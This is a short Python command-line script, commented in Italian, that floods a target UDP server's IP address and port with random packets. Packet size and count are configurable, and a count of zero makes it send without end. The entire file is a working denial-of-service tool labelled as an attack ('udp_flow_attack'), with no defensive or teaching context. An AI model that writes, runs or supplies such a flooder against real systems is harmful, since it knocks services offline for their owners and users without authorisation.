import sys
import os
import socket


DEFAULT_PACKET_SIZE = 1024
NUM_PACKETS = 10000

def print_use():
    print("Utilizzo: python nome_programma.py <ip> <porta> [dim_pacchetto] [num_pacchetti]")
    print("<ip>: indirizzo ip del server UDP da attaccare")
    print("<porta>: porta del server UDP da attaccare")
    print("[dim_pacchetto]: dimensione di un pacchetto da inviare - opzionale")
    print("[num_pacchetti]: numero dei pacchetti da inviare - opzionale")

def conv_param_to_int(param_index, default_value):
    try:
        param = int(sys.argv[param_index]) if len(sys.argv) > param_index else default_value
    except ValueError:
        print(f"Parametro {param_index} non valido")
        print_use()
        raise

    return param

def gen_packet(packet_size=DEFAULT_PACKET_SIZE):
    packet = os.urandom(packet_size)
    return packet


def udp_flow_attack(addr, packet_size=DEFAULT_PACKET_SIZE, packet_num=NUM_PACKETS):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    status = s.connect_ex(addr)
    if(status == 0):
        i = 0
        while True:
            packet = gen_packet(packet_size)
            s.sendto(packet, addr)
            if(packet_num != 0):        #Ciclo infinito in caso di parametro num pacchetti = 0
                i += 1
                if(i >= packet_num):
                    break
        print(f"Attacco completato: inviati {i} pacchetti")
    s.close()


def main():
    # Verifica se sono stati passati tutti i parametri necessari
    if len(sys.argv) < 3:
        print_use()
    else:
        ip = sys.argv[1]

        try:
            porta = conv_param_to_int(2, None)
            packet_size = int(sys.argv[3]) if len(sys.argv) > 3 else DEFAULT_PACKET_SIZE
            num_packets = int(sys.argv[4]) if len(sys.argv) > 4 else NUM_PACKETS
        except ValueError:
            return              #chiudi programma
        
        udp_flow_attack((ip, porta), packet_size, num_packets)

if __name__ == "__main__":
    main()
